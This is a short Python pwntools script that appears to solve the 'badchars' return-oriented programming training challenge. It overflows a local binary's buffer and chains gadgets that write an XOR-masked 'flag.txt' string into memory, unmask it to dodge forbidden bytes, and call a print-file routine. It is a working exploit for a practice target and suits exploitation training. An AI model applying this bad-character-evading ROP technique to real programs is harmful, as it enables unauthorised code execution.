from pwn import *

ending = 5*"\x00"

writeGadget = "\x34\x06\x40" + ending #mov qword [13], r12
pop12131415Gadget = "\x9c\x06\x40" + ending
xorGadget = "\x28\x06\x40" + ending #xor byte ptr [r15], r14b 
poprdiGadget = "\xa3\x06\x40" + ending
printfileAddress = "\x10\x05\x40" + ending

def WriteChain(dest, value):
	returnString = pop12131415Gadget
	returnString += value + dest
	returnString += 16*"\x00"
	returnString += writeGadget
	return returnString

def XorMaskChain(dest, maskByte):
	returnString = pop12131415Gadget
	returnString += 16*"\x00"
	returnString += maskByte + 7*"\x00" + dest
	returnString += xorGadget		
	return returnString

stringHole = "\x30\x10\x60" + ending
stringHole2 = "\x32\x10\x60" + ending
stringHole3 = "\x33\x10\x60" + ending
stringHole4 = "\x34\x10\x60" + ending
stringHole6 = "\x36\x10\x60" + ending

paddingReturn = "\xee\x04\x40" + ending

#fl`f/tyt XOR  __\x01\x01\x01_\x01_ = flag.txt
payload = "A"*40
payload += paddingReturn
payload += WriteChain(stringHole, "fl`f/tyt")
payload += XorMaskChain(stringHole2, "\x01")
payload += XorMaskChain(stringHole3, "\x01")
payload += XorMaskChain(stringHole4, "\x01")
payload += XorMaskChain(stringHole6, "\x01")
payload += poprdiGadget + stringHole
payload += printfileAddress 

challenge = process("./badchars")
#pause() #for attaching with debugger

challenge.sendafter(">", payload)
print(challenge.recvall())
challenge.close()

